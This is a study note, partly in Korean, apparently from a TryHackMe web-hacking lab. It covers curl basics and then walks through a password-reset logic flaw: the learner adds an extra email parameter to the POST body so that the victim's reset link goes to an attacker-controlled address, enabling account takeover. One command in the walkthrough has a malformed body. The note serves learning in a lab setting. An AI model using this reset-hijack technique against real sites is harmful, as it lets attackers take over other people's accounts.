# curl 

curl is a command-line tool to transfer data to or from a server, using any of the supported protocols (HTTP, FTP, IMAP, POP3, SCP, SFTP, SMTP, TFTP, TELNET, LDAP, or FILE)

---

curl 
```
root@ip-10-10-41-144:~# curl http://10.10.140.126 
<!--
This page is temporary while we work on the new homepage @ /new-home-beta
-->
<!DOCTYPE html>
```

-v : verbose mode
```
root@ip-10-10-41-144:~# curl http://10.10.140.126 -v
* Rebuilt URL to: http://10.10.140.126/
*   Trying 10.10.140.126...
* TCP_NODELAY set
* Connected to 10.10.140.126 (10.10.140.126) port 80 (#0)
> GET / HTTP/1.1
> Host: 10.10.140.126
> User-Agent: curl/7.58.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< Server: nginx/1.18.0 (Ubuntu)
< Date: Tue, 19 Apr 2022 02:34:37 GMT
< Content-Type: text/html; charset=UTF-8
< Transfer-Encoding: chunked
< Connection: keep-alive
< X-FLAG: THM{HEADER_FLAG}
< 
<!--
This page is temporary while we work on the new homepage @ /new-home-beta
-->
```
---


## 실습 

실습 사이트 
비번 변경 페이지 > 이메일 입력 > 이름 입력 > We'll send you a reset email to robert@acmeitsupport.thm

시도 1 
```
user@tryhackme$ curl 'http://10.10.3.25/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert'
```
```
<p>We'll send you a reset email to <strong>robert@acmeitsupport.thm</strong></p>
```
시도 2 : 받는 메일을 바꿀 수 있는지 확인 
```
user@tryhackme$ curl 'http://10.10.3.25/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'
```
```
<p>We'll send you a reset email to <strong>attacker@hacker.com</strong></p>
```
시도 3 
실습 홈페이지에서 회원가입 > kimbbang@customer.acmeitsupport.thm 메일 만들기

시도 4 : kimbbang@customer.acmeitsupport.thm로 비번 변경 메일 보내기 

```
user@tryhackme:~$ curl 'http://10.10.3.25/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&kimbbang@customer.acmeitsupport.thm'
```
시도 5 
kimbbang으로 로그인해서 회원 메일함을 확인하면 robert의 비번을 바꿀 수 있는 메일이 있음 


---
---

### Course
[TryHackMe - Introduction to Web Hacking](https://tryhackme.com/module/intro-to-web-hacking)    

### References
[geeksforgeeks - curl command in Linux with Examples](https://www.geeksforgeeks.org/curl-command-in-linux-with-examples/)   